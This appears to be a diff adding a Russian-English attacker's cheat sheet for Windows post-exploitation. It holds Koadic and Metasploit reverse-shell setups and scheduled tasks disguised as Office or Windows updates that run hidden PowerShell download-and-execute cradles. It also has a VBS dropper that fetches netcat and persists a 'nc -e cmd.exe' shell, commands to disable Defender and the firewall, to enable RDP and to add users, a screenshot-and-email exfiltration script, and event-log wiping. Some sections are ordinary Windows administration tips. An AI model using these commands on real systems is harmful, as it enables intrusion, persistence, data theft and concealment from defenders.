@@ -1,0 +1,1008 @@
+ wz Part5766775                                        _
+ _ __ ___   __ _ _ __  _ __  _   _  __ _| |
+| '_ ` _ \ / _` | '_ \| '_ \| | | |/ _` | |
+| | | | | | (_| | | | | | | | |_| | (_| | |
+|_| |_| |_|\__,_|_| |_|_| |_|\__,_|\__,_|_|
+
+
+KOADIC & NETCAT
+
+
+
+
+(koadic: sta/js/mshta)$ info
+
+        NAME        VALUE               REQ     DESCRIPTION     
+        -----       ------------        ----    -------------   
+        SRVHOST     192.168.1.11        yes     Where the stager should call home
+        SRVPORT     9999                yes     The port to listen for stagers on
+        EXPIRES                         no      MM/DD/YYYY to stop calling home
+        KEYPATH                         no      Private key for TLS communications
+        CERTPATH                        no      Certificate for TLS communications
+        MODULE                          no      Module to run once zombie is staged
+
+
+
+
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload windows/shell/reverse_tcp
+payload => windows/shell/reverse_tcp
+msf5 exploit(multi/handler) > set lhost 127.7.7.7
+lhost => 45.11.19.160
+msf5 exploit(multi/handler) > set lport 443
+lport => 443
+msf5 exploit(multi/handler) > set ExitOnSession false
+ExitOnSession => false
+msf5 exploit(multi/handler) > exploit -j -z
+
+
+
+C:\Windows\System32\schtasks.exe /CREATE /SC DAILY /TN "MyTask" /TR "C:\Users\putty.exe" /ST 12:20   создать задачу)ы
+	#(X86) - On User Login
+	schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onlogon /ru System
+ 
+	#(X86) - On System Start
+	schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onstart /ru System
+ 
+	#(X86) - On User Idle (30mins)
+	schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onidle /i 30
+ 
+	#(X64) - On User Login
+	schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onlogon /ru System
+ 
+	#(X64) - On System Start
+	schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onstart /ru System
+ 
+	#(X64) - On User Idle (30mins)
+	schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
+
+
+Удалить запланированное задание без запроса
+
+	schtasks /delete /f /TN taskname
+Подробный список запланированных задач
+
+	schtasks /query /V /FO list
+
+
+
+
+echo Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> C:\Users\Public\123.vbs & echo oXMLHTTP.Open "GET", "http://192.168.1.39/curl.exe", 0 >> C:\Users\Public\123.vbs & echo oXMLHTTP.Send >> C:\Users\Public\123.vbs & echo Set oADOStream = CreateObject("ADODB.Stream") >> C:\Users\Public\123.vbs & echo oADOStream.Mode = 3 >> C:\Users\Public\123.vbs & echo oADOStream.Type = 1 >> C:\Users\Public\123.vbs & echo oADOStream.Open >> C:\Users\Public\123.vbs & echo oADOStream.Write oXMLHTTP.responseBody >> C:\Users\Public\123.vbs & echo oADOStream.SaveToFile "C:\Users\Public\curl.exe", 2 >> C:\Users\Public\123.vbs & echo dim path, WshShell >> C:\Users\Public\123.vbs & echo path = "C:\Users\Public\" >> C:\Users\Public\123.vbs && start C:\Users\Public\123.vbs 
+&& echo WScript.Sleep(5000) >> C:\Users\Public\dcat.vbs 
+& echo Set objShell = WScript.CreateObject("WScript.Shell") >> C:\Users\Public\dcat.vbs 
+& echo objShell.Run("C:\Users\Public\curl.exe --output C:\ProgramData\nc.exe http://192.168.1.39/nc.txt") >> C:\Users\Public\dcat.vbs
+ 
+&& echo WScript.Sleep(5000) >> C:\Users\Public\dhta.vbs 
+& echo Set objShell = WScript.CreateObject("WScript.Shell") >> C:\Users\Public\dhta.vbs 
+& echo objShell.Run("C:\Users\Public\curl.exe --output C:\ProgramData\lv.hta http://192.168.1.39/lv.hta") >> C:\Users\Public\dhta.vbs 
+
+&& echo WScript.Sleep(5000) >> C:\Users\Public\hta.vbs 
+& echo Set objShell = WScript.CreateObject("WScript.Shell") >> C:\Users\Public\hta.vbs 
+& echo objShell.Run("C:\Users\Public\curl.exe --output C:\Users\Public\lv.hta http://192.168.1.39/lv.hta") >> C:\Users\Public\hta.vbs
+
+&& echo WScript.Sleep(50000) >> C:\Users\Public\shta.vbs 
+& echo Set objShell = WScript.CreateObject("WScript.Shell") >> C:\Users\Public\shta.vbs 
+& echo objShell.Run("mshta C:\Users\Public\lv.hta") >> C:\Users\Public\shta.vbs
+
+
+&& start C:\Users\Public\dcat.vbs & start C:\Users\Public\dhta.vbs & start C:\Users\Public\hta.vbs & start C:\Users\Public\shta.vbs
+& C:\Windows\System32\schtasks.exe /CREATE /SC DAILY /TN "microsoft\windows update" /TR "mshta C:\ProgramData\lv.hta" /ST 11:35
+& C:\Windows\System32\schtasks.exe /CREATE /SC DAILY /TN "microsoft\windowz" /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w Hidden C:\ProgramData\nc.exe 192.168.1.49 443 -e cmd.exe" /ST 14:35
+& C:\Windows\System32\schtasks /create /sc minute /mo 300 /tn "WinUP" /TR "C:\Users\Public\curl.exe --output C:\ProgramData\lv.hta http://192.168.1.39/lv.hta"
+
+
+
+ VBS - down-exec
+Set args = Wscript.Arguments
+Url = "http://domain/file"
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", Url, False
+xHttp.Send
+with bStrm
+.type = 1 '
+.open
+.write xHttp.responseBody
+.savetofile " C:\%homepath%\file", 2 '
+end with
+
+
+
+                 _                   _
+ _ __   ___  ___| |_  _____  ___ __ | |
+| '_ \ / _ \/ __| __ / _ \ \/ | '_ \| |
+| |_) | (_) \__ | |_|  __/>  <| |_) | |_
+| .__/ \___/|___/\__ \___/_/\_| .__/|_(_)
+|_|                           |_|
+
+
+qwinsta - получить список пользователей
+
+systeminfo
+
+whoami
+
+узнать антивир в системе
+
+
+	net start
+	sc query
+
+
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List   #av info cmd
+
+
+wmic startup list full        ---- список автозагрузки
+
+Get-WindowsOptionalFeature -Online | findstr Net    <<<    проверка .Net установленных в системе
+
+
+
+ ____ ___ ____                   _
+|  _ |_ _|  _ \       __ _ _   _| |_ ___  _ __ _   _ _ __
+| | | | || |_) _____ / _` | | | | __/ _ \| '__| | | | '_ \
+| |_| | ||  _ |_____| (_| | |_| | || (_) | |  | |_| | | | |
+|____|___|_| \_\     \__,_|\__,_|\__\___/|_|   \__,_|_| |_|
+
+
+C:\Users\ Имя_пользователя\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+
+
+  Удалить определения и отключить AV-защиту (полезно, когда скрипты Powershell блокируются Defender)
+
+  c:\program files\windows defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true
+
+
+Включить удаленный рабочий стол:
+
+  reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+
+добавить нового юзера
+
+net user myuser mypass /add
+
+
+View the list of started processes and the owner:
+
+	tasklist /v
+
+Kill a process by its name:
+
+	taskkill /F /IM "cmd.exe"
+
+Abort a shutdown/restart countdown:
+
+	shutdown /a
+
+
+
+включить RDP
+
+reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+netsh firewall set service remoteadmin enable
+netsh firewall set service remotedesktop enable
+
+
+Отключить брандмауер
+
+netsh firewall set opmode disable
+
+                 _                                _
+ _ __   ___  ___| |_      ___  ___  __ _ _ __ ___| |__
+| '_ \ / _ \/ __| _______/ __|/ _ \/ _` | '__/ __| '_ \
+| |_) | (_) \__ | ||_____\__ |  __| (_| | | | (__| | | |
+| .__/ \___/|___/\__|    |___/\___|\__,_|_|  \___|_| |_|
+|_|
+
+
+* - Означает любую последовательность любых символов, т.е. все символы.
+ 
+? - Любой один символ
+ 
+~<"something" - Поиск имени (Название файла, автор и тд., смотря где поставить) которое должно начинаться с того что в кавычках. 
+                В примере ищется имя, где начало something.
+ 
+~>"something" - Поиск имени, которое должно оканчиваться на то что в кавычках.
+ 
+="Курсовая работа" - Поиск точного совпадения с тем, что находится в кавычках.
+ 
+~="Курс" - Поиск имени, которые содержат точный набор символов как тот, который в кавычках. 
+           Т.е. по запросу имяфайла:~="курс" будут находиться файлы не только со словом Курс, 
+           но и просто содержащие эту последовательность символов (Курсовой, Курсач).
+ 
+~!"Курс" - Поиск файлов, которые не содержат того что в кавычках. 
+           Т.е. этот параметр полностью противоположен предыдущему.
+ 
+<> - Означает как "ни есть", "не". 
+     Т.е. запрос где будет вид: <> картинка, будет искать всё кроме картинок.
+ 
+() - Скобки служат для того чтобы отделять и уточнять комбинирующую группу, где действуют операторы.
+ 
+"" - Кавычки служат для точного нахождения порядка символов внутри кавычек. 
+     Из-за этого внутри кавычек операторы не работают вовсе, как и фильтры.
+ 
+размер:10МБ И автор: (Иван) НЕ датаизменения:>2009 - Найдёт файлы Ивана по 10 Мегабайт, которые изменены после 2009 года.
+ 
+имяфайла: (*156*) И тип:(PNG ИЛИ JPEG) - Найдёт файлы, где в имени содержится 156 и его расширение будет PNG либо JPEG.
+ 
+автор:( Ал* ИЛИ Иван) - Найдёт файлы авторов Алексея, Александра, Алёны и Ивана.
+ 
+имяфайла: - Имя искомого файла. 
+            Аналог на англоязычной Windows - filename.
+ 
+тип: Указывает какой тип файла ищется в данный момент. Может принимать как значения расширений файлов (Например, тип: PNG), 
+     так и их логическое определение (Например: тип: музыка или тип: картинка). 
+     Аналог на англоязычной Windows - type.
+ 
+вид: - Тоже самое что и тип:. 
+       Аналог на англоязычной Windows - kind:
+ 
+датаизменения: - Указывает на то, когда файлы был изменён. 
+                 Может принимать точные значения, диапазоны, а также словестные значения (давно, вчера и тд.). 
+                 Аналог на англоязычной Windows - datemodified.
+ 
+датаизменения: 05/25/2010
+ 
+датаизменения: >2009 
+ 
+датаизменения: 21.‎01.‎2001 .. ‎05.‎01.‎2014 (Обязательно две точки в диапазоне)
+ 
+датасоздания: - Указывает на то, когда файл был создан. 
+                Значения принимает такие же как и у датаизменения. 
+                Англоязычный аналог datecreated.
+ 
+размер: - Указывает какой размер должен быть у искомых файлов. 
+          Может принимать как точный значения вплоть до десятичных чисел, так и диапазон размеров. 
+          В качестве единицы измерения выступают Кб, Мб, Гб. 
+          Англоязычный параметр - size:.
+ 
+размер: <=7Мб >1.5Мб - файлы больше 1,5 мегабайта, но меньше или равны 7.
+ 
+атрибуты: - Задаёт дополнительную маску поиска по тегам. 
+            Параметр нечасто используется из-за того что редко используют теги.
+ 
+автор: - Указывание автора, чьи файлы будут находиться.
+ 
+владелец: - Поиск файлов определённого владельца.
+ 
+исполнитель: - Указывание данного атрибута релевантно при поиске музыки того или иного исполнителя.
+ 
+размер:5KB..20 KB тип:картинка имяфайла:~<"m" *little* датаизменения:‎01.‎03.‎2014 .. ‎31.‎03.‎2014
+
+
+
+
+
+Также ключи реестра где прописывает себя вирус , баннер смотрите тут:
+Ключи реестра автозагрузки:
+- [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
+ключ "Userinit"="С:\WINDOWS\system32\userinit.exe,"
+
+- [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
+ключ "Shell"="Explorer.exe"
+- [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
+- [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]
+- [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
+- [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run]
+- [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx]
+- [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon, VmApplet]
+- [HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows, run]
+- [HKEY_LOCAL_MACHINE\Software\Microsoft\Active Setup\Installed Components]
+- [HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager, BootExecute]
+- [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\{xxxxx-xx-xx-xx-xxxxx}]
+
+- C:\Documents and Settings\All Users\Start Menu\Programs\Startup
+- C:\Documents and Settings\All Users\Главное меню\Программы\Автозагрузка
+- C:\Documents and Settings\имя_пользователя\Главное меню\Программы\Автозагрузка
+
+- %username%\Главное меню\Программы\Автозагрузка - это папка, программы из которой будут запускаться для текущего пользовател (windows XP)
+- C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp - это папка, программы из которой будут запускаться для всех пользователей (windows 7+)
+- %username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp — это папка, программы из которой будут запускаться для текущего пользователя (windows 7+)
+
+
+
+
+
+---------------------------------------------------------------
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
+программы, которые запускаются при входе текущего пользователя в систему
+---------------------------------------------------------------
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce] 
+программы, которые запускаются только один раз при входе текущего пользователя в систему. 
+После этого ключи программ автоматически удаляются из данного раздела реестра.
+---------------------------------------------------------------
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+программы, которые запускаются при входе в систему для всех пользователей системы.
+---------------------------------------------------------------
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce] 
+программы, которые запускаются только один раз при входе пользователя в систему. 
+После этого ключи программ  автоматически удаляются из данного раздела реестра. 
+Данный раздел отвечает за запуск программ для всех пользователей системы.
+---------------------------------------------------------------
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx]
+программы, которые запускаются только один раз, когда загружается система.
+Этот раздел используется при инсталляции программ, например для запуска настроечных модулей. 
+После этого ключи программ автоматически удаляются из данного раздела реестра.
+Данный раздел отвечает за запуск программ для всех пользователей системы.
+---------------------------------------------------------------
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices]
+программы, которые загружаются при старте системы до входа пользователя в Windows.
+---------------------------------------------------------------
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce]
+программы отсюда загружаются только один раз, когда загружается система.
+---------------------------------------------------------------
+[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\BootExecute]
+программы запуска для всех пользователей
+---------------------------------------------------------------
+[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\TerminalServer\WdsVrdpwd\StartupPrograms]
+программы запуска для всех пользователей
+---------------------------------------------------------------
+Например, чтобы автоматически запускать программу Блокнот при входе текущего пользователя,
+открываем Редактор реестра (regedit.exe), переходим в раздел 
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run] 
+и добавляем следующий ключ: "NOTEPAD.EXE"="C:\WINDOWS\System32\notepad.exe"
+При этом программы из этого списка не отображаются в списке программ доступных для отключения в msconfig.exe, а также определяются не всеми менеджерами автозагрузки.
+---------------------------------------------------------------
+Программы могут запускаться и из следующего раздела реестра:
+[HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows]
+Параметры:
+"load"="programma" — программы запускаемые до входа пользователя в систему:
+"run" ="programma" — программы запускаемые после входа пользователя в систему.
+---------------------------------------------------------------
+Существует две папки — общая для всех пользователей и индивидуальная для текущего пользователя.
+Если при входе пользователя в систему удерживать нажатой клавишу "Shift", то программы из папок "Автозагрузка" запускаться не будут. 
+По умолчанию эти папки находятся здесь:
+..\Documents and Settings\All Users\Главное меню\Программы\Автозагрузка — это папка, программы из которой будут запускаться для всех пользователей компьютера. (windows XP)
+..\Documents and Settings\Username\Главное меню\Программы\Автозагрузка — это папка, программы из которой будут запускаться для текущего пользователя (windows XP).
+%username%\Главное меню\Программы\Автозагрузка - это папка, программы из которой будут запускаться для текущего пользовател (windows XP)
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp - это папка, программы из которой будут запускаться для всех пользователей (windows 7+)
+%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp — это папка, программы из которой будут запускаться для текущего пользователя (windows 7+)
+---------------------------------------------------------------
+Windows считывает данные о пути к папке "Автозагрузка" из реестра. 
+Этот путь прописан в следующих разделах:
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders]
+"Common Startup"="%ALLUSERSPROFILE%\Главное меню\Программы\Автозагрузка — для всех пользователей системы.
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders]
+"Startup"="%USERPROFILE%\Главное меню\Программы\Автозагрузка — для текущего пользователя.
+
+Сменив путь к папке мы получим автозагрузку всех программ из указанной папки. Например:
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders]
+"Startup"="c:\mystartup — система загрузит все программы, 
+ярлыки которых находятся в папке c:\mystartup\, при этом папка "Автозагрузка" 
+все так же будет отображаться в меню "Пуск", а если у пользователя 
+в ней ничего не было, то он и не заметит подмены.
+---------------------------------------------------------------
+
+
+
+обычно вирусы и баннеры меняют ниже указанные параметры реестра:
+Модифицирует следующие ключи реестра:
+[<HKCU>\Software\Microsoft\Windows NT\CurrentVersion\Winlogon] 'Shell' = '<Полный путь к вирусу>'
+[<HKCU>\Software\Microsoft\Windows\CurrentVersion\Run] 'Shell2' = '<Полный путь к вирусу>'
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
+ключ "Userinit"="С:\WINDOWS\system32\userinit.exe,"
+Он должен иметь такой вид "Userinit"="С:\WINDOWS\system32\userinit.exe," . 
+После запятой ничего не должно быть.
+
+Файл WINLOGON.EXE всегда расположен в C:\Windows\System32. 
+В случае обнаружения этого файла в любом другом каталоге он должен быть удален.
+
+Решение:
+1. Удаляем файл по указанному пути. (если вы пользуетесь командной строкой вводим explorer.exe нажимаем enter);
+2. Удаляем ключи реестра с указанием вируса или баннера.
+---------------------------------------------------------------
+Если при попытке входа в учетную запись загружается пустой рабочий стол.
+1. Смотрите ветку реестра
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
+ключ "Shell"="Explorer.exe"
+2. Если в ключе прописано что-то другое, то замените на указанное выше.
+3.Посмотреть что прописано в ветке
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows]
+"AppInit_DLLs"
+---------------------------------------------------------------
+
+
+
+reg add — Добавить параметр в реестр
+reg compare — Сравнивать части реестра.
+reg copy — Копирует из одного раздела в другой
+reg delete — Удаляет указанный параметр или раздел
+reg export — Экспортировать часть реестра
+reg import — Соответственно импортировать часть реестра
+reg load — Загружает выбранную часть реестра
+reg query — Выводит значения заданной ветки реестра
+reg restore — Восстанавливает выбранную часть реестра из файла
+reg save — Сохраняет выбранную часть реестра
+reg unload — Выгружает выбранную часть реестра
+__________________________________________
+ 
+regedit /s c:\dir\myfile.reg вот так применить без лишних вопросов значения раздела реестра
+Windows Registry Editor Version5.0
+-[HKEY_CURRENT_USER\Control Panel\Don't load] для удаления раздела
+[HKEY_CURRENT_USER\Control Panel\Don't load] 
+"desk.cpl"=- для удаления значения
+Любые разделы или значение если их не существует будут созданы.
+Если разделы или значения существуют,то они будут обновлены, при условии их присуствия в применяемом файле *.reg.
+
+
+
+
+ _ __  _ __ _____  ___   _
+| '_ \| '__/ _ \ \/ | | | |
+| |_) | | | (_) >  <| |_| |
+| .__/|_|  \___/_/\_\\__, |
+|_|                  |___/
+
+
+
+Command to enable proxy usage:///////////////////////////////////////////////////////////////////////////////////////////
+
+  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
+  
+  Command to disable proxy usage:
+
+  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0 /f
+  
+  Command to change the proxy address:
+
+  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d proxyserveraddress:proxyport /f
+  
+  Also, in this case, it is a per-user setting than a system-wide setting.
+
+
+
+Перенаправить удаленный порт на локальный адрес
+
+cmd.exe /c echo y | .\plink.exe -P 22 -l <USER> -pw "password" -R PORT_TO_FORWARD:127.0.0.1:ATTACKER_PORT <IP> 2>&1
+
+
+
+                                  _                 _
+ ___  ___ _ __ ___  ___ _ __  ___| |__   ___   ___ | |_
+/ __|/ __| '__/ _ \/ _ | '_ \/ __| '_ \ / _ \ / _ \| __|
+\__ | (__| | |  __|  __| | | \__ | | | | (_) | (_) | |_
+|___/\___|_|  \___|\___|_| |_|___|_| |_|\___/ \___/ \__|
+
+https://github.com/Viralmaniar/Powershell-RAT
+
+
+############################################################################
+# Capturing a screenshot
+#############################################################################
+#Param(
+#[Parameter(Mandatory = $true)][string]$Path
+#)
+$OutPath = "$env:USERPROFILE\Documents\ScreenShot"
+if (-not (Test-Path $OutPath))
+        {
+            New-Item $OutPath -ItemType Directory -Force
+        }
+$FileName = "$env:COMPUTERNAME - $(get-date -f yyyy-MM-dd_HHmmss).png"
+#$File = "$OutPath\$FileName"
+$File = Join-Path $OutPath $fileName
+Add-Type -AssemblyName System.Windows.Forms
+Add-type -AssemblyName System.Drawing
+# Gather Screen resolution information
+$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$Width = $Screen.Width
+$Height = $Screen.Height
+$Left = $Screen.Left
+$Top = $Screen.Top
+# Create bitmap using the top-left and bottom-right bounds
+$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+# Create Graphics object
+$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+# Capture screen
+$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+# Save to file
+$bitmap.Save($File) 
+#Write-Output "Screenshot saved to:"
+Write-Output $File
+#######################################################################
+
+
+
+
+                    _                 _ _
+ ___  ___ _ __   __|  _ __ ___   __ _(_| |
+/ __|/ _ | '_ \ / _` | '_ ` _ \ / _` | | |
+\__ |  __| | | | (_| | | | | | | (_| | | |
+|___/\___|_| |_|\__,_|_| |_| |_|\__,_|_|_|
+
+
+############################################################################
+# Sending email with attachments
+#############################################################################
+
+#Connection Details
+$username="throwawaygmailaccountaddress@gmail.com"
+$password="VeryStr0ngP@$$w0rd!"
+$smtpServer = "smtp.gmail.com"
+$msg = new-object Net.Mail.MailMessage
+
+#SMTP connection
+$smtp = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
+
+#SSL tunnel to communicate   
+$smtp.EnableSsl = $true
+
+$smtp.Credentials = New-Object System.Net.NetworkCredential($username,$password)
+
+#From Address
+$msg.From = "throwawaygmailaccountaddress@gmail.com"
+
+#To Address, Copy the below line for multiple recipients
+$msg.To.Add("throwawaygmailaccountaddress@gmail.com")
+
+#Message Body
+$msg.Body="Please See Attached Files"
+
+#Message Subject
+$msg.Subject = "Email with Multiple Attachments"
+
+#your file location
+$files=Get-ChildItem "$env:USERPROFILE\Documents\ScreenShot\"
+
+Foreach($file in $files)
+{
+Write-Host "Attaching File :- " $file
+$attachment = new-object System.Net.Mail.Attachment -ArgumentList $file.FullName
+$msg.Attachments.Add($attachment)
+
+}
+$smtp.Send($msg)
+write-host "	Mail Sent"
+$attachment.Dispose();
+$msg.Dispose();
+
+
+
+      _
+  ___| | ___  __ _ _ __
+ / __| |/ _ \/ _` | '__|
+| (__| |  __| (_| | |
+ \___|_|\___|\__,_|_|
+
+
+    
+
+for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
+
+
+powershell Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+
+Отключения логирования отдаваемых команд, и менюшка выполнения будет всегда пуста. 
+Иди в реестр по адресу [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]. 
+Создай параметр с именем ClearRecentDocsOnExit и значением 01000000.
+
+
+
+
+ ____  _____ ____      ____           _    _
+|  _ \| ____/ ___|    |  _ \  ___ ___| | _| |_ ___  _ __
+| |_) |  _|| |   _____| | | |/ _ / __| |/ | __/ _ \| '_ \
+|  _ <| |__| |__|_____| |_| |  __\__ |   <| || (_) | |_) |
+|_| \_|_____\____|    |____/ \___|___|_|\_\\__\___/| .__/
+                                                   |_|
+
+
+
+ 
+ psr.exe [/start |/stop][/output <fullfilepath>] [/sc (0|1)] [/maxsc <value>]
+    [/sketch (0|1)] [/slides (0|1)] [/gui (o|1)]
+    [/arcetl (0|1)] [/arcxml (0|1)] [/arcmht (0|1)]
+    [/stopevent <eventname>] [/maxlogsize <value>] [/recordpid <pid>]
+
+
+/start — старт записи;
+/stop — остановка записи;
+/output — путь к файлу с результатами записи. Это обязательный параметр;
+/sc — указывает, должны ли делаться снимки экрана (0 — без снимков, 1 — снимки делаются). Если не указывать этот параметр, то снимки создаются;
+/maxsc — максимальное количество снимков (минимум 0, максимум 100);
+/maxlogsize — максимальный размер mht-файла (в МБ) перед архивированием;
+/gui — показывать или нет графическую оболочку (0 — без GUI, 1 — с GUI). По умолчанию GUI показывается;
+/arcetl — включить в архив файл в формате ETL (0 — не включать, 1 — включать);
+/arcxml  — включить в архив файл в формате XML (0 — не включать, 1 — включать);
+/arcmht  — включить в архив файл в формате MHT (0 — не включать, 1 — включать). По умолчанию mht-файл входит в архив;
+/recordpid — запись действий, ассоциированных с указанным PID;
+/sketch —  создавать эскиз экрана, если отключено создание снимков (0 — не создавать, 1 — создавать);
+/slides — создавать слайд-шоу из HTML-страниц (0 — не создавать, 1 — создавать). По умолчанию слайд-шоу создается;
+/stopevent — сгенерировать системное событие после создания файла.
+
+Например:
+
+psr.exe /start /output C:\Temp\psr1.zip /gui 0 /sc 1
+psr.exe /stop
+
+
+• Каждый снимок включает в себя содержимое всех мониторов, подключенных к компьютеру;
+• После достижения максимального количества снимков запись не останавливается, просто более старые снимки перезаписываются;
+• При записи действий любой текст, введенный с клавиатуры, записан не будет. Если требуется описать введенные команды, то необходимо воспользоваться возможностью добавления комментариев.
+
+
+
+                     ********          Как запретить повторный запуск приложения         *********
+
+
+https://technet.microsoft.com/ru-ru/sysinternals/pslist.aspx - бесплатная утилита, которую можно скачать здесь
+
+pslist - бесплатная утилита
+-е для поиска точного имени процесса, иначе находит любые процессы с подходящим началом имени
+
+Если приложение запускается bat-файлом, то отследить (и запретить) его повторный запуск можно таким образом:
+pslist.exe -e "процесс"
+if %errorlevel%==1 start "" "программа"                                                  
+
+
+                              **************       Узнать историю посещения сайтов
+
+ipconfig /displaydns | select-string "Имя записи" | Sort >> text.txt  [Powershell]
+
+
+                      *************            Ярлыки для всех юзеров на рабочий стол 
+       кладем сюда
+c:\Users\Public\Desktop\
+ 
+Ярлыки для всех юзеров в пуск кладем сюда
+c:\Users\All Users\Microsoft\Windows\Start Menu\Programs\
+c:\Users\Все пользователи\Microsoft\Windows\Start Menu\Programs\
+c:\ProgramData\Microsoft\Windows\Start Menu\Programs\
+
+
+
+Запрет запуска приложения через реестр
+
+Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+“DisallowRun”=dword:00000001
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun]
+“1″=”программа.exe”
+“2″=”другая_программа.exe”
+
+
+Список всех настроек в одном месте 
+1. Щелкните правой кнопкой мыши на любом пустом пространстве рабочего стола. 
+2. Перейдите в меню Создать и создайте новую папку. 
+3. Переименуйте папку следующим образом: ЛюбоеИмя.{ED7BA470-8E54-465E-825C-99712043E01C}
+
+
+Удаление программ
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall - установленные программы (Программы и компоненты)
+{50A0F899-A8B3-42B3-8494-BFD8276C785B} - ЭТО ID программы, которую необходимо удалить
+msiexec /X {50A0F899-A8B3-42B3-8494-BFD8276C785B} /q - удалить программу
+http://support.microsoft.com/kb/290301 -Windows Installer CleanUp - сервисная программа (msicuu2.exe) ( вроде как удаляет запись из реестра)
+
